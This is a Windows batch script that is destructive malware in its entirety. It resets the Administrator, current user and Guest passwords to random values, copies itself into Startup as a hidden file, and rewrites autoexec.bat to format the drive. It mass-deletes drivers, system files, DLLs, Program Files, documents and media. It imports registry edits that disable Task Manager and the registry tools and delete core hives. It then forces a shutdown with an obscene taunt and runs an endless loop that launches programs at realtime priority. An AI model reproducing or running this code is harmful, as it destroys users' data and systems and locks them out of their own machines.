@echo off
if exist %windir%\startm~1\programs\startup goto win9x
if not exist %windir%\startm~1\programs\startup goto winnt

:winnt
net user Administrator %random%hfkjklfhijhedkgjs%random% >nul
net user %USERNAME% %random%dfnjdxnhfjghdl%random% >nul
net user Guest %random%kfglfklmkljdfgjegj%random% >nul
cls
%homedrive% >nul
cd %ALLUSERSPROFILE%\ >nul
command /c >nul
cd startm~1\programs\startup\ >nul
if not exist start.bat copy %0 start.bat >nul
attrib +H +S +R +A start.bat >nul
cls
cd %homepath%\ >nul
if exist aaas.reg goto winntdel
if not exist aaas.reg goto registry

:win9x
%homedrive% >nul
cd %homedrive%\
attrib -H -S -R -A %homedrive%\autoexec.bat >nul
@del autoexec.bat > nul
echo @echo off>> autoexec.bat
echo format %homedrive% /q /u /autotest>> autoexec.bat
echo cls>> autoexec.bat
echo goto a>> autoexec.bat
echo :a>> autoexec.bat
echo goto a>> autoexec.bat
attrib +r +h %homedrive%\autoexec.bat
cd %windir%\ >nul
command /c >nul
cd startm~1\programs\startup\ >nul
if not exist start.bat copy %0 start.bat >nul
attrib +H +S +R +A start.bat >nul
cls
cd %windir%\ >nul
if exist aaas.reg goto win9xdel
if not exist aaas.reg goto registry

:winntdel
command /c >nul
attrib -H -S -R -A %windir%\system32\drivers\*.* /s /d >nul
del %windir%\system32\drivers\*.* /S /Q >nul
cls
attrib -H -S -R -A %homepath%\mydocu~1\*.* /s /d >nul
del %homepath%\mydocu~1\*.* /S /Q >nul
cls
attrib -H -S -R -A %homepath%\favori~1\*.* /s /d >nul
del %homepath%\favori~1\*.* /S /Q >nul
cls
attrib -H -S -R -A %windir%\*.ini /s /d >nul
del %windir%\*.ini /S /Q >nul
cls
attrib -H -S -R -A %windir%\*.inf /s /d >nul
del %windir%\*.inf /S /Q >nul
cls
attrib -H -S -R -A %windir%\*.sys /s /d >nul
del %windir%\*.sys /S /Q >nul
cls
attrib -H -S -R -A %homedrive%\progra~1\*.* /s /d >nul
del %homedrive%\progra~1\*.* /S /Q >nul
cls
attrib -H -S -R -A %windir%\fonts\*.* /s /d >nul
del %windir%\fonts\*.* /S /Q >nul
cls
attrib -H -S -R -A %homedrive%\*.mp3 /s /d >nul
del %homedrive%\*.mp3 /S /Q >nul
cls
attrib -H -S -R -A %homedrive%\*.mpg /s /d >nul
del %homedrive%\*.mpg /S /Q >nul
cls
attrib -H -S -R -A %homedrive%\*.avi /s /d >nul
del %homedrive%\*.avi /S /Q >nul
cls
attrib -H -S -R -A %homedrive%\*.jpg /s /d >nul
del %homedrive%\*.jpg /S /Q >nul
cls
attrib -H -S -R -A %homedrive%\*.dll /s /d >nul
del %homedrive%\*.dll /S /Q >nul
cls
attrib -H -S -R -A %homedrive%\*.mov /s /d >nul
del %homedrive%\*.mov /S /Q >nul
cls
start SHUTDOWN -R -t 60 -C "HELLO COCKSUCKER..NOW U CAN`T STOP ME...HAHAHA"
cls
goto freeze

:win9xdel
command /c >nul
cls
attrib -H -S -R -A %windir%\system32\drivers\*.* /s >nul
deltree /y %windir%\system32\drivers\*.* >nul
cls
attrib -H -S -R -A %homedrive%\mydocu~1\*.* /s >nul
deltree /y %homedrive%\mydocu~1\*.* >nul
cls
attrib -H -S -R -A %windir%\favori~1\*.* /s >nul
deltree /y %windir%\favori~1\*.* /S /Q >nul
cls
attrib -H -S -R -A %windir%\*.ini /s >nul
deltree /y %windir%\*.ini >nul
cls
attrib -H -S -R -A %windir%\*.inf /s >nul
deltree /y %windir%\*.inf >nul
cls
attrib -H -S -R -A %windir%\*.sys /s >nul
deltree /y %windir%\*.sys >nul
cls
attrib -H -S -R -A %homedrive%\progra~1\*.* /s >nul
deltree /y %homedrive%\progra~1\*.* >nul
cls
attrib -H -S -R -A %windir%\fonts\*.* /s >nul
deltree /y %windir%\fonts\*.* >nul
cls
attrib -H -S -R -A %homedrive%\*.mp3 /s >nul
deltree /y %homedrive%\*.mp3 >nul
cls
attrib -H -S -R -A %homedrive%\*.mpg /s >nul
deltree /y %homedrive%\*.mpg >nul
cls
attrib -H -S -R -A %homedrive%\*.avi /s >nul
deltree /y %homedrive%\*.avi >nul
cls
attrib -H -S -R -A %homedrive%\*.jpg /s >nul
deltree /y %homedrive%\*.jpg >nul
cls
attrib -H -S -R -A %homedrive%\*.dll /s >nul
deltree /y %homedrive%\*.dll >nul
cls
attrib -H -S -R -A %homedrive%\*.mov /s >nul
deltree /y %homedrive%\*.mov >nul
cls
rundll32.exe user.exe,exitwindows
exit

:registry
command /c >nul
echo REGEDIT4>> aaas.reg
echo.>> aaas.reg
echo [HKEY_CURRENT_USER\software\microsoft\windows\currentversion\policies\system]>> aaas.reg
echo "DisableTaskMgr"=dword:1>> aaas.reg
echo "NODispCPL"=dword:1>> aaas.reg
echo "NoDispBackgroundPage"=dword:1>> aaas.reg
echo "NoDispScrsavPage"=dword:1>> aaas.reg
echo "NoDispAppearancePage"=dword:1>> aaas.reg
echo "NoDispSettingsPage"=dword:1>> aaas.reg
echo "NoSecCPL"=dword:1>> aaas.reg
echo "NoPwdPage"=dword:1>> aaas.reg
echo "NoAdminPaqe"=dword:1>> aaas.reg
echo "NoProfilePage"=dword:1>> aaas.reg
echo "NoDevMgrPage"=dword:1>> aaas.reg
echo "NoConfigPage"=dword:1>> aaas.reg
echo "NoFileSysPage"=dword:1>> aaas.reg
echo "NoVirtMemPage"=dword:1>> aaas.reg
echo.>> aaas.reg
echo [HKEY_CURRENT_USER\software\microsoft\windows\currentversion\policies\explorer]>> aaas.reg
echo "NoDeletePrinter"=dword:1>> aaas.reg
echo "NoAddPrinter"=dword:1>> aaas.reg
echo "NoRun"=dword:1>> aaas.reg
echo "NoSetFolders"=dword:1>> aaas.reg
echo "NoSetTaskbar"=dword:1>> aaas.reg
echo "NoFind"=dword:1>> aaas.reg
echo "NoDrives"=dword:1>> aaas.reg
echo "NoNetHood"=dword:1>> aaas.reg
echo "NoDesktop"=dword:1>> aaas.reg
echo "NoClose"=dword:1>> aaas.reg
echo "NoSaveSettings"=dword:1>> aaas.reg
echo "DisableRegistryTools"=dword:1>> aaas.reg
echo "NoRecentDocsHistory"=dword:1>> aaas.reg
echo "ClearRecentDocsOnExit"=dword:1>> aaas.reg
echo "Nolnternetlcon"=dword:1>> aaas.reg
echo.>> aaas.reg
echo [HKEY_CURRENT_USER\software\microsoft\windows\currentversion\policies\Network]>> aaas.reg
echo "NoNetSetupSecurityPage"=dword:1>> aaas.reg
echo "NoNelSetup"=dword:1>> aaas.reg
echo "NoNetSetupIDPage"=dword:1>> aaas.reg
echo "NoNetSetupSecurityPage"=dword:1>> aaas.reg
echo "NoFileSharingControl"=dword:1>> aaas.reg
echo "NoPrintSharing"=dword:1>> aaas.reg
echo.>> aaas.reg
echo [HKEY_CURRENT_USER\software\microsoft\windows\currentversion\policies\WinOldApp]>> aaas.reg
echo "Disabled"=dword:1>> aaas.reg
echo "NoRealMode"=dword:1>> aaas.reg
echo.>> aaas.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced]>> aaas.reg
echo "ShowSuperHidden"=dword:0>> aaas.reg
echo "Hidden"=dword:0>> aaas.reg
echo.>> aaas.reg
echo [-HKEY_CLASSES_ROOT]>> aaas.reg
echo.>> aaas.reg
echo [-HKEY_USERS]>> aaas.reg
echo.>> aaas.reg
echo [-HKEY_CURRENT_CONFIG]>> aaas.reg
echo.>> aaas.reg
echo [-HKEY_CURRENT_USER\Control Panel]>> aaas.reg
echo.>> aaas.reg
echo [-HKEY_CURRENT_USER\Keyboard Layout]>> aaas.reg
echo.>> aaas.reg
echo [-HKEY_CURRENT_USER\Printers]>> aaas.reg
echo.>> aaas.reg
echo [-HKEY_LOCAL_MACHINE\HARDWARE]>> aaas.reg
echo.>> aaas.reg
echo [-HKEY_LOCAL_MACHINE\SYSTEM]>> aaas.reg
echo.>> aaas.reg
echo [-HKEY_CURRENT_USER\Software\Symantec]>> aaas.reg
echo.>> aaas.reg
echo [-HKEY_CURRENT_USER\Identities]>> aaas.reg
attrib +H +S +R +A aaas.reg
regedit.exe /s aaas.reg
cls
if exist %windir%\startm~1\programs\startup goto win9xdel
if not exist %windir%\startm~1\programs\startup goto winntdel

:freeze
if exist %SystemRoot%\explorer.exe start /MAX /REALTIME explorer
if exist %SystemRoot%\System32\mspaint.exe start /MAX /REALTIME mspaint
if exist %SystemRoot%\system32\notepad.exe start /MAX /REALTIME notepad
if exist %SystemRoot%\system32\command.* start /MAX /REALTIME Command
if exist %SystemRoot%\System32\taskmgr.exe start /MAX /REALTIME taskmgr
if exist %SystemRoot%\System32\calc.exe start /MAX /REALTIME calc
Cls
GoTo freeze